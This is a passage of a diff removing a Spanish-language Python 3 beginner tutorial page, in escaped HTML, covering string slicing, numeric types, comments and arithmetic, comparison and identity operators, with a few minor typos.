-&lt;p&gt;Si no indicamos alguno de los numeros lo que hace Python3 es leer hasta el final.&lt;/p&gt;
-
-&lt;h2 id=&quot;stride&quot;&gt;Stride&lt;/h2&gt;
-
-&lt;p&gt;Es una variante más del slicing. Si se añade un : adicional y un tercer índice, se designa una stride, que indica cuantos caracteres saltar hasta obtener el siguiente caracter.&lt;/p&gt;
-
-&lt;p&gt;Este salto lo hara contando el propio caracter.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Hola Python&quot;
-
-lenguaje[0:4:2]
-
-'Hl'
-
-lenguaje[0:4:1]
-
-'Hola'
-
-nombre[0:8:3]
-
-'ha'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;modificación-de-strings&quot;&gt;Modificación de Strings&lt;/h2&gt;
-
-&lt;p&gt;Una string es un tipo de dato que en Python3 se considera &lt;code&gt;inmutable&lt;/code&gt;, esto quiere decir que no podemos modificar una parte de un string asociada a una variable&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Python&quot;
-
-lenguaje[2]
-
-'t'
-
-lenguaje[2] = 'a'
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-37-3f77b4874756&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 lenguaje[2] = 'a'
-
-TypeError: 'str' object does not support item assignment
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero a pesar de no poderse modificar el contenido de una string, si se puede asignar un string diferente a la variable.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;golang&quot;
-
-print(lenguaje)
-
-golang
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;strings-de-multiples-lineas&quot;&gt;Strings de multiples lineas&lt;/h2&gt;
-
-&lt;p&gt;Si en alguna ocasion queremos definir &lt;code&gt;strings&lt;/code&gt; de varias lineas podemos hacerlo de varias formas en Python3&lt;/p&gt;
-
-&lt;p&gt;Una de ellas seria introducir el caracter &lt;code&gt;\n&lt;/code&gt; en la posicion de la cadena donde queremos que realize el salto de linea&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;Mi\nlenguaje\nfavorito\nes\nPython&quot;
-
-print(lenguaje)
-Mi
-lenguaje
-favorito
-es
-Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Otra opción tambien podria usar los caracteres &lt;code&gt;&quot;&quot;&quot;&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;lenguaje = &quot;&quot;&quot;Mi
-lenguaje
-favorito
-es
-Python
-&quot;&quot;&quot;
-
-print(lenguaje)
-Mi
-lenguaje
-favorito
-es
-Python
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;numeros&quot;&gt;Numeros&lt;/h1&gt;
-
-&lt;p&gt;Existen 3 tipos de datos numéricos: enteros &lt;code&gt;int&lt;/code&gt;, números de punto flotante &lt;code&gt;float&lt;/code&gt; y números complejos.&lt;/p&gt;
-
-&lt;h2 id=&quot;numeros-enteros&quot;&gt;Numeros Enteros&lt;/h2&gt;
-
-&lt;p&gt;Los números enteros son aquellos que no tienen parte decimal. En Python3 se referencian con la palabra &lt;code&gt;int&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;num = 10
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;No olvidemos que es muy importante la diferencia de un número entero y una cadena de texto que representa un número entero.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;num = 10
-num = &quot;10&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos convertir una cadena de texto que representa un número entero en un valor numérico utilizando la función &lt;code&gt;int()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = &quot;10&quot;
-
-print(numero)
-
-'10'
-
-numero2 = int(numero)
-
-print(numero2)
-
-10
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para separar algunos dígitos para que sea más facil de leer. No podemos usar el &lt;code&gt;.&lt;/code&gt; o &lt;code&gt;,&lt;/code&gt; , para esto Python3 nos da la opcion de usar &lt;code&gt;_&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 5000000
-
-print(numero)
-
-5000000
-
-numero2 = 5_000_000
-
-print(numero2)
-
-5000000
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;No hay límite en el tamaño de los números enteros que podemos definir, ya que se pueden definir números enteros tan grandes como la memoria de nuestro sistema soporte.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
-
-print(numero)
-
-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;numeros-flotantes&quot;&gt;Numeros Flotantes&lt;/h2&gt;
-
-&lt;p&gt;Los números flotantes son aquellos que tienen una parte decimal, en &lt;code&gt;Python3&lt;/code&gt; se referencian con la palabra &lt;code&gt;float&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 10.5
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;De igual manera que con los números enteros, se puede convertir una cadena de texto que representa un número flotante a un valor numérico utilizando la función &lt;code&gt;float()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = &quot;12.4&quot;
-
-print(numero)
-
-'12.4'
-
-numero2 = float(numero)
-
-print(numero2)
-
-12.4
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Existen tres formas de representarlos en Python3.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 1000.0
-
-numero2 = 1_000.0
-
-numero3 = 1e3
-
-print(numero1)
-
-1000.0
-
-print(numero2)
-
-1000.0
-
-print(numero3)
-
-1000.0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A diferencia que los números enteros, los número de flotantes si tienen un tamaño máximo en Python3. Aunque el tamaño máximo dependera de nuestro sistema, las cifras cercanas o mayores a &lt;code&gt;2e400&lt;/code&gt; que equivale a &lt;code&gt;(2x10)^400&lt;/code&gt; suelen superar el tamaño máximo.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 2e400
-
-print(numero)
-
-inf
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Python3 devuelve &lt;code&gt;inf&lt;/code&gt; haciendo referencia a infinito.&lt;/p&gt;
-
-&lt;h2 id=&quot;numeros-complejos&quot;&gt;Numeros complejos&lt;/h2&gt;
-
-&lt;p&gt;Hay pocos lenguajes de programacion que ofrecen soporte integrado para números complejos y Python3 es uno de ellos. Aunque los números complejos no suelen aparecer fuera de los dominios de la computación científica, pueden ser de gran utilidad en dominios que usen técnicas estadísticas.&lt;/p&gt;
-
-&lt;p&gt;Un número complejo esta formado por 2 componentes distintos: una parte real y una parte imaginaria.&lt;/p&gt;
-
-&lt;p&gt;En Python3 podemos definir un numero complejo, se define la parte real seguida de un símbolo + y la parte imaginaria terminando con la letra j.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 2 + 4j
-
-print(numero)
-
-(2+4j)
-
-numero.real
-
-2.0
-
-numero.imag
-
-4.0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;comentarios&quot;&gt;Comentarios &lt;a href=&quot;#comentarios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Los comentarios son parte fundamental en cualquier lenguaje de programación. Permiten describir partes del código que desarrollamos de manera que sea mucho más facil de comprender. Poner comentarios en nuestro código es una muy buena práctica que debemos realizar.&lt;/p&gt;
-
-&lt;p&gt;La manera más simple de poner comentarios en Python3 es utilizando el símbolo &lt;code&gt;#&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Este es mi comentario
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos hacer lo mismo despues de escribir una sentencia en nuestro codigo haciendo referencia al significado de esta:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = &quot;Hola Python3&quot; # Esto es una variable
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;comentarios-de-varias-lineas&quot;&gt;Comentarios de varias lineas&lt;/h2&gt;
-
-&lt;p&gt;Hay ocasiones en que necesitemos poner comentarios de varias líneas. Python3 no permite crear un comentario de varias líneas utilizando el mismo símbolo #.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;# Este comentario
-# tiene varias lineas
-# para mi ejemplo en Python3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Existe una manera mas sencilla y comoda de hacer comentarios en Python3 con el uso de &lt;code&gt;&quot;&quot;&quot; todo el comentario &quot;&quot;&quot;&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;&quot;&quot;&quot;
-Este comentario
-tiene varias líneas
-para mi ejemplo en Python3
-&quot;&quot;&quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;operadores-aritmeticos&quot;&gt;Operadores Aritmeticos &lt;a href=&quot;#operadores-aritmeticos&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;A continuación se muestran los operadores aritméticos soportados por Python3:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Operador&lt;/th&gt;
-      &lt;th&gt;Significado&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a + b&lt;/td&gt;
-      &lt;td&gt;suma&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a - b&lt;/td&gt;
-      &lt;td&gt;resta&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a * b&lt;/td&gt;
-      &lt;td&gt;multiplicacion&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a / b&lt;/td&gt;
-      &lt;td&gt;division&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a % b&lt;/td&gt;
-      &lt;td&gt;modulo&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a // b&lt;/td&gt;
-      &lt;td&gt;division de enteros&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a ** b&lt;/td&gt;
-      &lt;td&gt;exponencial&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;suma-y-resta&quot;&gt;Suma y Resta&lt;/h2&gt;
-
-&lt;p&gt;Los operadores suma &lt;code&gt;+&lt;/code&gt;y resta &lt;code&gt;-&lt;/code&gt; se pueden aplicar a distintos tipos de datos.&lt;/p&gt;
-
-&lt;h3 id=&quot;sumar-y-restar-datos-numericos&quot;&gt;Sumar y restar datos numericos&lt;/h3&gt;
-
-&lt;p&gt;Al sumar o restar tipos de datos numericos obtenemos el resultado matematico.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10
-
-numero2 = 8
-
-print(numero1 + numero2)
-
-18
-
-print(numero1 - numero2)
-
-8
-
-print(numero2 - numero1)
-
--2
-
-numero3 = 2.5
-
-numero4 = 1.5
-
-print(numero3 + numero4)
-
-4.0
-
-print(numero3 - numero4)
-
-1.0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;sumar-y-restar-datos-strings&quot;&gt;Sumar y restar datos strings&lt;/h3&gt;
-
-&lt;p&gt;Cuando sumamos tipos de datos strings se concatenan las variables.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Hola&quot;
-
-texto2 = &quot;Python&quot;
-
-print(texto1 + texto2)
-
-'HolaPython'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Si queremos agregar un espacio, debemos agregar una cadena vacia &lt;code&gt;&quot; &quot;&lt;/code&gt;, sin embargo no podemos restar dichas cadenas.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;print(text1 + &quot; &quot; + text2)
-
-'Hola Python'
-
-print(texto1 - texto2)
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-16-ed11b0c86524&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 texto1 - texto2
-
-TypeError: unsupported operand type(s) for -: 'str' and 'str'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;multiplicación-y-división&quot;&gt;Multiplicación y División&lt;/h2&gt;
-
-&lt;p&gt;Los operadores de multiplicacion &lt;code&gt;*&lt;/code&gt; y division &lt;code&gt;/&lt;/code&gt; son operadores binarios que pueden aplicarse sobre distintos tipos de datos.&lt;/p&gt;
-
-&lt;h3 id=&quot;multiplicar-y-dividir-datos-numericos&quot;&gt;multiplicar y dividir datos numericos&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 20
-
-numero2 = 4
-
-numero1 * numero2
-
-80
-
-# IMPORTANTE: El resultado al dividir siempre es un float
-
-print(numero1 / numero2)
-
-5.0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;multiplicar-y-dividir-datos-strings&quot;&gt;multiplicar y dividir datos strings&lt;/h3&gt;
-
-&lt;p&gt;No podemos multiplicar o dividir cadenas de texto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Hola&quot;
-
-texto2 = &quot;Python&quot;
-
-texto1 * texto2
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-21-4d766fa04d9a&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 texto1 * texto2
-
-TypeError: can't multiply sequence by non-int of type 'str'
-
-print(texto1 / texto2)
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-22-7ba20b66d6c5&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 texto1 / texto2
-
-TypeError: unsupported operand type(s) for /: 'str' and 'str'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero si podemos multiplicar una cadena de texto por un numero entero, que imprime el numero de veces de la cadena segun el que numero por el que multiplicamos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 * 3
-
-'HolaHolaHola'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;modulo&quot;&gt;Modulo&lt;/h2&gt;
-
-&lt;p&gt;El operador modulo &lt;code&gt;%&lt;/code&gt; es un operador binario que devuelve el resto de una división entre tipos de datos numericos ya sean enteros o flotantes.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10
-
-numero2 = 7
-
-print(numero1 % numero2)
-
-3
-
-print(numero2 % numero1)
-
-7
-
-numero1 = 10.5
-
-numero2 = 7.2
-
-print(numero1 % numero2)
-
-3.3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;exponencial&quot;&gt;Exponencial&lt;/h2&gt;
-
-&lt;p&gt;El operador exponencial &lt;code&gt;**&lt;/code&gt; es un operador binario que se aplica solo en tipos de datos numéricos.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 5
-
-numero1 ** 2
-
-25
-
-numero ** 3
-
-125
-
-texto1 = &quot;Hola Python&quot;
-
-texto1 ** 2
-
----------------------------------------------------------------------------
-TypeError                                 Traceback (most recent call last)
-&amp;lt;ipython-input-33-a3cd4ee7680f&amp;gt; in &amp;lt;module&amp;gt;
-----&amp;gt; 1 texto1 ** 2
-
-TypeError: unsupported operand type(s) for ** or pow(): 'str' and 'int'
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&quot;division-entera&quot;&gt;Division Entera&lt;/h2&gt;
-
-&lt;p&gt;El operador divison entera &lt;code&gt;//&lt;/code&gt;es un operador binario que se aplica sobre tipos de datos numéricos y devuelve la parte entera del resultado.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10
-
-numero2 = 7
-
-print(numero1 / numero2)
-
-1.4285714285714286
-
-print(numero1 // numero2)
-
-1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;operadores-de-asignación&quot;&gt;Operadores de Asignación &lt;a href=&quot;#operadores-de-asignación&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Anteriormente ya hemos usado el operador de asignación &lt;code&gt;=&lt;/code&gt; para asignar un valor a una variable.&lt;/p&gt;
-
-&lt;p&gt;Sin embargo Python3 nos proporciona un mecanismo para combinar operadores aritméticos y operadores de asignación simplificando nuestro codigo. Esa combinación se denomina &lt;code&gt;Augmented Assignment&lt;/code&gt;.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Operador&lt;/th&gt;
-      &lt;th&gt; &lt;/th&gt;
-      &lt;th&gt;Significado&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a += 4&lt;/td&gt;
-      &lt;td&gt;es igual a&lt;/td&gt;
-      &lt;td&gt;a = a + 4&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a -= 8&lt;/td&gt;
-      &lt;td&gt;es igual a&lt;/td&gt;
-      &lt;td&gt;a = a - 8&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a *= 10&lt;/td&gt;
-      &lt;td&gt;es igual a&lt;/td&gt;
-      &lt;td&gt;a = a * 10&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;a /= 5&lt;/td&gt;
-      &lt;td&gt;es igual a&lt;/td&gt;
-      &lt;td&gt;a = a / 5&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Veamos unos ejemplos:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero = 15
-
-numero += 5
-
-print(numero)
-
-20
-
-numero2 = 20
-
-numero2 *= 2
-
-print(numero2)
-
-40
-
-numero3 = 8
-
-numero3 -= 3
-
-print(numero3)
-
-5
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h1 id=&quot;booleanos&quot;&gt;Booleanos &lt;a href=&quot;#booleanos&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Los tipos de datos Boolenos en Python se representan con el tipo &lt;code&gt;bool&lt;/code&gt; y reciben únicamente dos posibles valores:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;True&lt;/li&gt;
-  &lt;li&gt;Fase&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = True
-
-print(variable)
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos usar la funcion reservada &lt;code&gt;type&lt;/code&gt; para ver el tipo de variable&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;variable = True
-
-type(varaible)
-
-bool
-
-variable2 = False
-
-type(variable2)
-
-bool
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una cosa a tener en cuenta es que las palabras &lt;code&gt;True&lt;/code&gt; y &lt;code&gt;False&lt;/code&gt; son palabras reservadas dentro de Python3 y no se les puede asignar ningún valor.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;True = &quot;Hola Python&quot;
-
-  File &quot;&amp;lt;ipython-input-7-31dbcec71c48&amp;gt;&quot;, line 1
-    True = &quot;Hola Python&quot;
-    ^
-SyntaxError: cannot assign to True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;operadores-de-comparación&quot;&gt;Operadores de Comparación &lt;a href=&quot;#operadores-de-comparación&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Son los que evalúan la relación que existe entre dos valores en Python. Existen diferentes tipos:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Operador&lt;/th&gt;
-      &lt;th&gt;Ejemplo&lt;/th&gt;
-      &lt;th&gt;Significado&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;==&lt;/td&gt;
-      &lt;td&gt;a == b&lt;/td&gt;
-      &lt;td&gt;Igual a&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;!=&lt;/td&gt;
-      &lt;td&gt;a != b&lt;/td&gt;
-      &lt;td&gt;No igual a&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&amp;lt;&lt;/td&gt;
-      &lt;td&gt;a &amp;lt; b&lt;/td&gt;
-      &lt;td&gt;Menor que&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&amp;lt;=&lt;/td&gt;
-      &lt;td&gt;a &amp;lt;= b&lt;/td&gt;
-      &lt;td&gt;Menor que o igual a&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&amp;gt;&lt;/td&gt;
-      &lt;td&gt;a &amp;gt; b&lt;/td&gt;
-      &lt;td&gt;Mayor que&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&amp;gt;=&lt;/td&gt;
-      &lt;td&gt;a &amp;gt;= b&lt;/td&gt;
-      &lt;td&gt;Mayor que o igual a&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h3 id=&quot;comparación-entre-datos-numericos&quot;&gt;Comparación entre datos numericos&lt;/h3&gt;
-
-&lt;p&gt;A continacion veremos algunos ejemplos&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 4
-
-numero2 = 8
-
-numero1 == 4
-
-True
-
-numero1 == numero2
-
-False
-
-numero1 == 4.0
-
-True
-
-numero1 != 4
-
-False
-
-numero1 != numero2
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Otros ejemplos&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;numero1 = 10
-
-numero2 = 15
-
-numero1 &amp;lt; numero2
-
-True
-
-numero2 &amp;lt; numero1
-
-False
-
-numero1 &amp;lt;= 10.0
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;comparación-entre-datos-strings&quot;&gt;Comparación entre datos strings&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;cadena de texto&quot;
-
-texto2 = &quot;cadena de texto 2&quot;
-
-texto1 == &quot;cadena de texto&quot;
-
-True
-
-text1 == text2
-
-False
-
-text1 != text2
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora veamos un tipo de comparación mas inusual&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Cadena de mi texto&quot;
-
-texto2 = &quot;texto&quot;
-
-texto1 &amp;lt; texto2
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ver algo muy extraño&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Esta comparación utiliza un orden lexicográfico: primero se comparan los dos primeros elementos, y si estos son diferentes, determina el resultado de la comparación; si son iguales, se comparan los dos siguientes elementos, y así sucesivamente, hasta que se agote cualquiera de las dos secuencias.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;y ahora se preguntaran si segun el principio tenemos arriba como primer caracter de &lt;code&gt;texto1 -&amp;gt; C&lt;/code&gt; y de &lt;code&gt;texto2 -&amp;gt; t&lt;/code&gt; como entonces lo esta haciendo?&lt;/p&gt;
-
-&lt;p&gt;Pues esto es por la sencilla razon de que esta comparacion lo realiza utilizando los equivalentes numericos de cada caracter, esto mediante la funcion reservada &lt;code&gt;ord()&lt;/code&gt;que recibe un caracter y se encarga de transformar un caracter a codigo unicode.&lt;/p&gt;
-
-&lt;p&gt;Veamoslo mejor con el ejemplo anterior:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#texto1 = &quot;Cadena de mi texto&quot;
-#texto2 = &quot;texto&quot;
-#condicion texto1 &amp;lt; texto2
-
-&quot;Cadena de mi texto&quot; &amp;lt; &quot;texto&quot;
-
-True
-
-#Cojemos los primeros caracteres de ambas variables y les aplicamos la funcion ord()
-
-ord('C')
-
-67
-
-ord('t')
-
-116
-
-#tendriamos que C = 67 y t = 116
-
-67 &amp;lt; 116
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Despues de analizar el ejemplo anterior, efectivamente vemos que la condicion era cierta y ahora nos queda claro como es que funciona.&lt;/p&gt;
-
-&lt;h1 id=&quot;operadores-de-identidad&quot;&gt;Operadores de Identidad &lt;a href=&quot;#operadores-de-identidad&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;
-
-&lt;p&gt;Los operadores de identidad se utilizan para comparar objetos. Sin embargo, no comparan si los objetos son iguales, en su lugar, comparan si son el mismo objeto:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Operador&lt;/th&gt;
-      &lt;th&gt;Ejemplo&lt;/th&gt;
-      &lt;th&gt;Significado&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;is&lt;/td&gt;
-      &lt;td&gt;x is y&lt;/td&gt;
-      &lt;td&gt;Devuelve &lt;code&gt;True&lt;/code&gt; si las dos variables son el mismo objeto&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;is not&lt;/td&gt;
-      &lt;td&gt;x is not y&lt;/td&gt;
-      &lt;td&gt;Devuelve `True si las dos variables no son el mismo objeto&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Veamoslo mejor en un caso practico:&lt;/p&gt;
-
-&lt;p&gt;tenemos dos variables:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;texto1 = &quot;Hola Python&quot;
-
-text2 = &quot;Hola Python&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que ambas variables tienen el mismo valor, pero si aplicamos la funcion reservada &lt;code&gt;id()&lt;/code&gt;  en cada variable nos da un valor diferente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;id(texto1)
-
-140608469061488
-
-id(texto2)
-
-140608469060976
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Te preguntaras a que corresponde el valor que nos muestra despues de aplicar la funcion; pues el resultado viene a ser el valor de la porcion de memoria que se le asigna a esa variable en ese preciso momento, ya que si volvemos a crear la misma variable con el mismo valor de nuevo nos mostrara un valor diferente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
-texto1 = &quot;Hola Python&quot;
-
-id(texto1)
-
-140608469400944
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora aplicaremos la comparacion de indentidad a nuestras dos variables previamente creadas:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;
-texto1 is texto2
-
-False
-
-texto1 == texto2
-
-True
-&lt;/code&gt;&lt;/pre&gt;
-
